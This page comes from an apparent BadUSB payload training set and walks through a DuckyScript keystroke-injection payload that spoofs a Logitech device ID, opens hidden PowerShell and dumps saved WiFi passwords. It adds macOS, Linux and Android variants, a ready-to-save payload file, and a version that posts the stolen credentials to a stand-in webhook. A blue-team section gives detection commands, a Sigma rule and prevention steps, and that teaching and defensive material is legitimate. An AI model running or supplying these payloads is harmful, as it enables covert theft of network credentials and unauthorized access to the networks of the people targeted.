# FZ-I02: WiFi Password Extractor

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I02 |
| **Name** | WiFi Password Extractor |
| **Difficulty** | Intermediate |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~8 seconds |
| **Output** | %TEMP%\wifi.txt |
| **MITRE ATT&CK** | T1555.003 (Credentials from Password Stores) |

## What This Payload Does

Extracts all saved WiFi network names and their plaintext passwords from Windows Wireless Profile storage. This information is stored locally and accessible to any user with local admin rights.

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: WiFi Password Extractor
REM Target: Windows 10/11
REM Action: Extracts saved WiFi passwords
REM Output: %TEMP%\wifi.txt
REM Skill: Intermediate
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500

REM Extract WiFi profiles and passwords
STRINGLN (netsh wlan show profiles) | Select-String ': (.+)$' | ForEach-Object {$name=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {(netsh wlan show profile name="$name" key=clear)} | Select-String 'Key Content\s+:\s+(.+)$','SSID name\s+:\s+(.+)$' | Out-File "$env:TEMP\wifi.txt"
STRINGLN exit
```

---

## Line-by-Line Breakdown

### The Core Command Explained

```powershell
# Step 1: Get all WiFi profile names
(netsh wlan show profiles)

# Step 2: Extract just the profile names using regex
| Select-String ': (.+)$'

# Step 3: For each profile name
| ForEach-Object {$name=$_.Matches.Groups[1].Value.Trim(); $_}

# Step 4: Show profile with key in clear text
| ForEach-Object {(netsh wlan show profile name="$name" key=clear)}

# Step 5: Extract SSID and Key Content lines
| Select-String 'Key Content\s+:\s+(.+)$','SSID name\s+:\s+(.+)$'

# Step 6: Save to file
| Out-File "$env:TEMP\wifi.txt"
```

### Why This Works

Windows stores WiFi passwords locally using DPAPI (Data Protection API). The `netsh wlan` command with `key=clear` decrypts and displays the password for any user with local admin rights or the user who connected to the network.

---

## Sample Output

```
SSID name                   : "HomeNetwork"
Key Content                 : MyPassword123!

SSID name                   : "CoffeeShop_WiFi"
Key Content                 : welcome2coffee

SSID name                   : "CorpNetwork"
Key Content                 : C0rp$ecur3!2024
```

---

## Cross-Platform Versions

### macOS

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
STRINGLN security find-generic-password -ga "NetworkName" 2>&1 | grep password > /tmp/wifi.txt
REM Requires user password prompt - limited use
```

**Note**: macOS requires authentication to access Keychain, limiting BadUSB effectiveness.

### Linux

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
STRINGLN sudo cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -E 'ssid=|psk=' > /tmp/wifi.txt
REM Requires sudo password - root access needed
```

**Note**: NetworkManager stores WiFi passwords in `/etc/NetworkManager/system-connections/` with root-only access.

### Android (Root Required)

```ducky
DELAY 4000
GUI
DELAY 1000
STRING termux
ENTER
DELAY 3000
STRINGLN su -c "cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || cat /data/misc/wifi/WifiConfigStore.xml" > /sdcard/wifi.txt
```

**Note**: Requires rooted device. Non-rooted Android cannot access WiFi credentials.

### Mobile Platform Limitations

| Platform | WiFi Password Access | Notes |
|----------|---------------------|-------|
| Windows | Full Access | netsh shows cleartext |
| macOS | Requires Auth | Keychain prompts user |
| Linux | Root Required | NetworkManager protected |
| Android | Root Required | Stored in protected paths |
| iOS | Not Possible | Keychain completely locked |

---

## Red Team Perspective

### Attack Value

| Information | Use Case |
|-------------|----------|
| Corporate WiFi | Network access from parking lot |
| Home WiFi | Return access to target |
| VPN/Enterprise | May reveal naming conventions |
| Guest Networks | Often weaker security |

### Attack Chain

```
WiFi Extraction → Network Access → Internal Reconnaissance → Lateral Movement
      ↑
  You are here
```

### Enhancing the Payload

#### Version with Exfiltration

```ducky
REM Extract and send to webhook
STRINGLN $wifi = (netsh wlan show profiles) | Select-String ': (.+)$' | ForEach-Object {$n=$_.Matches.Groups[1].Value.Trim(); $p=((netsh wlan show profile name="$n" key=clear) | Select-String 'Key Content\s+:\s+(.+)$').Matches.Groups[1].Value; "$n`:$p"} | Out-String
STRINGLN Invoke-WebRequest -Uri "https://your.webhook.site" -Method POST -Body $wifi
```

#### Version with Better Formatting

```ducky
STRINGLN netsh wlan show profiles | ForEach-Object { if ($_ -match 'All User Profile\s+:\s+(.+)$') { $ssid = $matches[1]; $key = (netsh wlan show profile name="$ssid" key=clear | Select-String 'Key Content\s+:\s+(.+)$').Matches.Groups[1].Value; "$ssid = $key" }} | Out-File "$env:TEMP\wifi.txt"
```

---

## Blue Team Perspective

### Detection Opportunities

1. **Process Monitoring**
   - `netsh.exe` with `wlan show profile` and `key=clear`
   - Unusual netsh activity patterns

2. **Command Line Logging**
   - Event ID 4688 with command line auditing
   - PowerShell Script Block Logging

3. **File Creation**
   - New files in %TEMP% with WiFi-related content
   - Sysmon Event ID 11

### Detection Script

```powershell
# Check for recent netsh wlan commands
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4688
} -MaxEvents 1000 | Where-Object {
    $_.Message -match 'netsh.*wlan.*key=clear'
} | Select TimeCreated, Message
```

### Sigma Rule

```yaml
title: WiFi Password Extraction via Netsh
status: experimental
description: Detects extraction of WiFi passwords using netsh
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        CommandLine|contains|all:
            - 'netsh'
            - 'wlan'
            - 'show'
            - 'profile'
            - 'key=clear'
    condition: selection
level: high
tags:
    - attack.credential_access
    - attack.t1555.003
```

### Prevention

1. **Group Policy**
   - Restrict netsh.exe execution for standard users
   - Enable command-line auditing

2. **Network Configuration**
   - Use 802.1X authentication instead of PSK
   - Implement certificate-based WiFi

3. **Endpoint Protection**
   - EDR rules for netsh credential access
   - Block hidden PowerShell windows

---

## Practice Exercises

### Exercise 1: Count Networks
Modify to only count how many WiFi networks are saved:
```ducky
STRINGLN (netsh wlan show profiles).Count
```

### Exercise 2: Specific Network
Extract password for a specific network name:
```ducky
STRINGLN netsh wlan show profile name="TargetNetwork" key=clear
```

### Exercise 3: Export to CSV
Format output as CSV for easier parsing:
```ducky
STRINGLN netsh wlan show profiles | ForEach-Object { if ($_ -match 'All User Profile\s+:\s+(.+)$') { $s=$matches[1]; $k=(netsh wlan show profile name="$s" key=clear | Select-String 'Key Content\s+:\s+(.+)$').Matches.Groups[1].Value; [PSCustomObject]@{SSID=$s;Password=$k}}} | Export-Csv "$env:TEMP\wifi.csv" -NoTypeInformation
```

---

## Payload File

Save as `FZ-I02_WiFi_Password_Extractor.txt`:

```ducky
REM FZ-I02: WiFi Password Extractor
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500
STRINGLN (netsh wlan show profiles)|%{if($_-match':\s+(.+)$'){$n=$matches[1];netsh wlan show profile name="$n" key=clear|?{$_-match'Key Content|SSID'}}}|Out-File "$env:TEMP\wifi.txt";exit
```

---

[← FZ-I01 System Info Collector](FZ-I01_System_Info_Collector.md) | [Back to Intermediate](README.md) | [Next: FZ-I03 Browser Data Locator →](FZ-I03_Browser_Data_Locator.md)
